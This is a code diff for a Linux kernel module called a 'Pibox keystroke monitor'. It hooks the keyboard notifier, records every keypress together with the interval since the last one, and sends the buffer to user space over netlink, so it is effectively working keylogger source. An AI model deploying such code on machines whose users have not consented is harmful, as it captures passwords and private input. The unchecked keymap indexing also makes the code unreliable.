@@ -1,12 +1,11 @@
-#include <linux/delay.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
-#include <linux/keyboard.h>
+#include <linux/keyboard.h>         /* notifier_block */
 #include <linux/module.h>
 #include <linux/semaphore.h>
-#include <linux/string.h>        /* memset and strncpy */
-#include <linux/uaccess.h>       /* copy_to_user() */
-#include <net/sock.h>            /* Needed for netlink */
+#include <linux/string.h>           /* memset and strncpy */
+#include <linux/uaccess.h>          /* copy_to_user() */
+#include <net/sock.h>               /* Needed for netlink */
 #include <linux/netlink.h>
 #include <linux/skbuff.h>
 
@@ -15,6 +14,10 @@
 
 #define KEYPRESS_BUFFSIZE 1024   /* Max keypress buff size */
 #define SEP_BUFFSIZE      500
+
+/* Function Prototypes */
+static int kb_notify(struct notifier_block *, unsigned long, void *);       /* Keyboard notification callback */
+static void nl_send_msg(void);                                              /* Netlink callback for sending info to user space */
 
 /* Keypress mappings */
 static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
@@ -40,35 +43,29 @@ static const char* keymapShiftActivated[] =
 
 static struct semaphore sem;
 
+/* Specify which function to call for keyboard notification events */
+static struct notifier_block kb_nb = { .notifier_call = kb_notify };
+
 /* Kernel netlink socket */
 static struct sock *nl_sk = NULL;
 
 /* Keypress data buffer */
 static char keypress_buff[KEYPRESS_BUFFSIZE];
 
-/* Default delay expressed in jiffies */
-static int delay = HZ;
-
-/* Initial time stamp for keypress calculation */
+/* Initial time stamp used for calculating keypress time displacement */
 static unsigned long init_stamp = 0;
 
-/* Caluculated time of separation between kepyresses */
+/* Caluculated time of separation between two kepyresses */
 static unsigned long stroke_separation;
 
-/* Object for keypress validation */
+/* Struct for storing keypress data */
 struct keypress {
     int keycode;
     char separation[SEP_BUFFSIZE];
 } key;
 
-/* Shift key is pressed */
+/* Shift key is currently depressed */
 static int shiftKeyDepressed = 0;
-
-/* Keyboard notification callback */
-static int kb_notify(struct notifier_block *, unsigned long, void *);
-
-/* Netlink callback */
-static void nl_send_msg(void);
 
 /* Keyboard notification callback */
 static int kb_notify(struct notifier_block *nblock, unsigned long action, void *data)
@@ -77,9 +74,6 @@ static int kb_notify(struct notifier_block *nblock, unsigned long action, void *
     jiff = jiffies;
 
     unsigned long diff;
-
-    char keyval[21];
-    // char separation[SEP_BUFFSIZE];
 
     struct keyboard_notifier_param *param = data;
     if (action == KBD_KEYCODE)
@@ -96,7 +90,7 @@ static int kb_notify(struct notifier_block *nblock, unsigned long action, void *
         }
         if (param->down)
         {
-            // Acquire lock to acces global variables */
+            /* Acquire lock to acces global variables */
             down(&sem);
 
             memset(&keypress_buff, '\0', sizeof keypress_buff);
@@ -105,13 +99,11 @@ static int kb_notify(struct notifier_block *nblock, unsigned long action, void *
                 .keycode = param->value
             };
 
-            /* Store the correct key value */
+            /* Retrieve the correct caps or non-caps character string */
             if (shiftKeyDepressed == 0)
-                strncpy(keyval, keymap[param->value], sizeof keyval);
+                strncpy(keypress_buff, keymap[key.keycode], strlen(keymap[key.keycode]));
             else
-                strncpy(keyval, keymapShiftActivated[param->value], sizeof keyval);
-
-            strncpy(keypress_buff, keyval, sizeof keyval);
+                strncpy(keypress_buff, keymapShiftActivated[key.keycode], strlen(keymapShiftActivated[key.keycode]));
 
             if(!init_stamp)
             {
@@ -121,10 +113,10 @@ static int kb_notify(struct notifier_block *nblock, unsigned long action, void *
             }
             else
             {
-                /* Caluclate the keystroke time */
+                /* Caluclate the keystroke time displacement */
                 curr_stamp = jiff;
                 diff = (long)curr_stamp - (long)init_stamp;
-                stroke_separation = diff * 1000 / delay;
+                stroke_separation = diff * 1000 / HZ;
                 
                 /* Convert the stroke separation into a string for later storage */
                 snprintf(key.separation, sizeof key.separation, "%ld", stroke_separation);
@@ -137,24 +129,19 @@ static int kb_notify(struct notifier_block *nblock, unsigned long action, void *
                         stroke_separation, param->value);
             }
 
-            /* Copy the stroke separation measurement into the separation buffer */
-            // strncpy(separation, key.separation, sizeof separation);
-
             /* Append the key's separation measurement to the keypress buffer */
             strncat(keypress_buff, " ", 2);
             strncat(keypress_buff, key.separation, SEP_BUFFSIZE - 1);
             pr_info("Keypress buffer: %s\n", keypress_buff);
 
-            /* Send the keypress packet to user space */
             up(&sem);
+
+            /* Send the keypress packet to user space */
             nl_send_msg();
         }
     }
     return NOTIFY_OK;
 }
-
-/* Create the notifier_block object */
-static struct notifier_block kb_nb = { .notifier_call = kb_notify };
 
 static void nl_send_msg(void)
 {
@@ -163,15 +150,6 @@ static void nl_send_msg(void)
     int msg_size = strlen(keypress_buff) + 1;
     int res;
 
-    //pr_info("Entering message send function\n");
-
-    //nlh = (struct nlmsghdr *)skb->data;
-    //pr_info("Netlink received msg payload: %s\n",
-    //        (char *)NLMSG_DATA(nlh));
-
-    //pid = nlh->nlmsg_pid;       [> pid of sending process <]
-
-    /* Send the keypress bufer from kernel to user */
     skb_out = nlmsg_new(msg_size, GFP_KERNEL);
     if (!skb_out)
     {
@@ -179,9 +157,6 @@ static void nl_send_msg(void)
         return;
     }
 
-    //nlh->nlmsg_len = NLMSG_SPACE(KEYPRESS_BUFFSIZE);
-    //nlh->nlmsg_pid = 0;     [> from kernel <]
-    //nlh->nlmsg_flags = 0;
     nlh = nlmsg_put(skb_out, 0, 1, NLMSG_DONE, msg_size, 0);
 
     strncpy(nlmsg_data(nlh), keypress_buff, msg_size);
@@ -194,7 +169,7 @@ static void nl_send_msg(void)
 
 static int __init kb_init(void)
 {
-    memset(&keypress_buff, '\0', sizeof keypress_buff);
+    // memset(&keypress_buff, '\0', sizeof keypress_buff);
 
     /* Create the netlink socket */
     nl_sk = netlink_kernel_create(&init_net, MYPROTO, NULL);
@@ -222,6 +197,6 @@ static void __exit kb_exit(void)
 module_init(kb_init);
 module_exit(kb_exit);
 
-MODULE_AUTHOR("Emerson");
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Emerson");
 MODULE_DESCRIPTION("Pibox keystroke monitor");
